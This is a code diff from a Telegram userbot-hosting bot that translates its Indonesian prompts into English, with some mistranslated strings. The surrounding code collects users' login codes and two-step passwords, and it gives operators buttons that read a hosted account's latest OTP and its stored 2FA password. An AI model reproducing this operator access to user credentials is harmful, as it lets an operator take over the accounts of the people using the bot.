@@ -20,19 +20,19 @@ async def need_api(client, callback_query):
         return await bot.send_message(
             user_id,
             f"""
-<b>❌ Tidak Membuat Userbot !</b>
+<b>❌ Not Creating Userbot !</b>
 
-<b>📚 Karena Telah Mencapai Yang Telah Di Tentukan : {len(ubot._ubot)}</b>
+<b>📚 Because It Has Reached What Has Been Determined : {len(ubot._ubot)}</b>
 
-<b>👮‍♂ Silakan Hubungi Admin . </b>
+<b>👮‍♂ please contact admins . </b>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
         )
     if user_id not in await get_prem():
         buttons = [
-            [InlineKeyboardButton("➡️ Lanjutkan", callback_data="bayar_dulu")],
-            [InlineKeyboardButton("❌ Batalkan", callback_data=f"home {user_id}")],
+            [InlineKeyboardButton("➡️ Continue", callback_data="bayar_dulu")],
+            [InlineKeyboardButton("❌ Cancel", callback_data=f"home {user_id}")],
         ]
         await callback_query.message.delete()
         return await bot.send_message(
@@ -64,25 +64,25 @@ async def bikin_ubot(client, callback_query):
         api_id_msg = await bot.ask(
             user_id,
             (
-                "<b>Silahkan masukkan API ID anda.</b>\n"
-                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
+                "<b>Please enter your API ID.</b>\n"
+                "\n<b>Use /cancel to Cancel the Userbot Creation Process</b>"
             ),
             timeout=300,
         )
     except asyncio.TimeoutError:
-        return await bot.send_message(user_id, "Waktu Telah Habis")
+        return await bot.send_message(user_id, "Time Has Run Out")
     if await is_cancel(callback_query, api_id_msg.text):
         return
     try:
         api_id = int(api_id_msg.text)
     except ValueError:
-        return await bot.send_message(user_id, "API ID Haruslah berupa angka.")
+        return await bot.send_message(user_id, "API ID Must be a number.")
     await callback_query.message.delete()
     api_hash_msg = await bot.ask(
         user_id,
         (
-            "<b>Silahkan masukkan API HASH anda.</b>\n"
-            "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
+            "<b>Please enter your API HASH.</b>\n"
+            "\n<b>Use /cancel to Cancel the Userbot Creation Process</b>"
         ),
         timeout=300,
     )
@@ -94,8 +94,8 @@ async def bikin_ubot(client, callback_query):
         phone = await bot.ask(
             user_id,
             (
-                "<b>Silahkan Masukkan Nomor Telepon Telegram Anda Dengan Format Kode Negara.\nContoh: +628xxxxxxx</b>\n"
-                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
+                "<b>Please enter your Telegram phone number with the country code format.\nExample: +628xxxxxxx</b>\n"
+                "\n<b>Use /cancel to Cancel the Userbot Creation Process</b>"
             ),
             timeout=300,
         )
@@ -110,7 +110,7 @@ async def bikin_ubot(client, callback_query):
         api_hash=api_hash,
         in_memory=True,
     )
-    get_otp = await bot.send_message(user_id, "<b>Mengirim Kode OTP...</b>")
+    get_otp = await bot.send_message(user_id, "<b>Sending OTP ...</b>")
     await new_client.connect()
     try:
         code = await new_client.send_code(phone_number.strip())
@@ -145,9 +145,9 @@ async def bikin_ubot(client, callback_query):
         otp = await bot.ask(
             user_id,
             (
-                "<b>Silakan Periksa Kode OTP dari <a href=tg://openmessage?user_id=777000>Akun Telegram</a> Resmi. Kirim Kode OTP ke sini setelah membaca Format di bawah ini.</b>\n"
-                "\nJika Kode OTP adalah <code>12345</code> Tolong <b>[ TAMBAHKAN SPASI ]</b> kirimkan Seperti ini <code>1 2 3 4 5</code>\n"
-                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
+                "<b>Please Check OTP Code from <a href=tg://openmessage?user_id=777000>Official Telegram Account</a>. Send OTP Code here after reading the Format below.</b>\n"
+                "\n If OTP Code is <code> 12345 </code> Please <b>[ ADD SPACE ]</b> send it Like this <code>1 2 3 4 5</code> \n"
+                "\n<b>Use /cancel to Cancel the Userbot Creation Process</b>"
             ),
             timeout=300,
         )
@@ -172,7 +172,7 @@ async def bikin_ubot(client, callback_query):
         try:
             two_step_code = await bot.ask(
                 user_id,
-                "<b>Akun anda Telah mengaktifkan Verifikasi Dua Langkah. Silahkan Kirimkan Passwordnya.\n\nGunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>",
+                "<b>Your account has enabled Two-Step Verification. Please send the password.\n\nUse /cancel to cancel the process of creating a userbot</b>",
                 timeout=300,
             )
         except asyncio.TimeoutError:
@@ -224,7 +224,7 @@ async def bikin_ubot(client, callback_query):
             pass
     for mod in loadModule():
         importlib.reload(importlib.import_module(f"ubot.modules.{mod}"))
-    text_done = f"<b>🔥 {bot.me.mention} Berhasil Di Aktifkan Di Akun :\n<a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code>\n\nIni adalah Grup Log Anda : {ngentot} .</b>"
+    text_done = f"<b>🔥 {bot.me.mention} Successfully Activated On Account :\n<a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code>\n\nIni is your Log Group : {ngentot} .</b>"
     await bot_msg.edit(text_done)
     try:
         await new_client.join_chat("kynansupport")
@@ -233,8 +233,8 @@ async def bikin_ubot(client, callback_query):
     return await bot.send_message(
         LOG_UBOT,
         f"""
-<b>❏ Userbot Diaktifkan</b>
-<b> ├ Akun :</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
+<b>❏ Userbot Activated</b>
+<b> ├ Account :</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
 <b> ╰ ID :</b> <code>{new_client.me.id}</code>
 """,
         reply_markup=InlineKeyboardMarkup(
@@ -277,7 +277,7 @@ async def tools_userbot(client, callback_query):
     query = callback_query.data.split()
     if user_id not in USER_ID:
         return await callback_query.answer(
-            f"❌ Jangan Di Klik Mas {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
+            f"❌ Don't Click, Sir. {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
             True,
         )
     X = ubot._ubot[int(query[1])]
@@ -285,7 +285,7 @@ async def tools_userbot(client, callback_query):
         async for otp in X.search_messages(777000, limit=1):
             try:
                 if not otp.text:
-                    await callback_query.answer("❌ Kode tidak ditemukan", True)
+                    await callback_query.answer("❌ Code not found", True)
                 else:
                     await callback_query.edit_message_text(
                         otp.text,
@@ -299,7 +299,7 @@ async def tools_userbot(client, callback_query):
     elif query[0] == "get_phone":
         try:
             return await callback_query.edit_message_text(
-                f"<b>📲 Nomer telepon <code>{X.me.id}</code> adalah <code>{X.me.phone_number}</code></b>",
+                f"<b>📲 phone number <code>{X.me.id}</code> adalah <code>{X.me.phone_number}</code></b>",
                 reply_markup=InlineKeyboardMarkup(
                     Button.userbot(X.me.id, int(query[1]))
                 ),
@@ -310,11 +310,11 @@ async def tools_userbot(client, callback_query):
         code = await get_two_factor(X.me.id)
         if code == None:
             return await callback_query.answer(
-                "🔐 Kode verifikasi 2 langkah tidak ditemukan", True
+                "🔐 2-step verification code not found", True
             )
         else:
             return await callback_query.edit_message_text(
-                f"<b>🔐 Kode verifikasi 2 langkah pengguna <code>{X.me.id}</code> adalah : <code>{code}</code></b>",
+                f"<b>🔐 2-step verification code not found <code>{X.me.id}</code> is : <code>{code}</code></b>",
                 reply_markup=InlineKeyboardMarkup(
                     Button.userbot(X.me.id, int(query[1]))
                 ),
@@ -329,9 +329,9 @@ async def tools_userbot(client, callback_query):
         return await callback_query.edit_message_text(
             f"""
 <b>❏ Penting !! </b>
-<b>├ Akun :</b> <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a>
+<b>├ Account :</b> <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a>
 <b>├ ID :</b> <code>{X.me.id}</code>
-<b>╰ Akun berhasil Di Hapus</b>
+<b>╰ Account successful deleted </b>
 """,
             reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[1]))),
         )
@@ -350,16 +350,16 @@ async def cek_userbot_expired(client, callback_query):
     expired = await get_expired_date(user_id)
     try:
         xxxx = (expired - datetime.now()).days
-        return await callback_query.answer(f"⏳ Tinggal {xxxx} hari lagi", True)
+        return await callback_query.answer(f"⏳ Stay {xxxx} another day", True)
     except:
-        return await callback_query.answer("✅ Sudah tidak aktif", True)
+        return await callback_query.answer("✅ No longer active", True)
 
 
 async def hapus_ubot(client, callback_query):
     user_id = callback_query.from_user.id
     if user_id not in USER_ID:
         return await callback_query.answer(
-            f"❌ Jangan Diklik Boss {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
+            f"❌ Don't Click Boss{callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
             True,
         )
     try:
@@ -381,9 +381,9 @@ async def hapus_ubot(client, callback_query):
             ubot._ubot.remove(X)
             await X.log_out()
             await bot.send_message(
-                OWNER_ID, f"<b> ✅ {get_mention} Berhasil Di Hapus Dari Database</b>"
+                OWNER_ID, f"<b> ✅ {get_mention} Successfully Removed From Database</b>"
             )
-            return await bot.send_message(X.me.id, "<b>💬 Masa Aktif Anda Telah Habis")
+            return await bot.send_message(X.me.id, "<b>💬 Your Active Time Has Expired")
 
 
 async def is_cancel(callback_query, text):
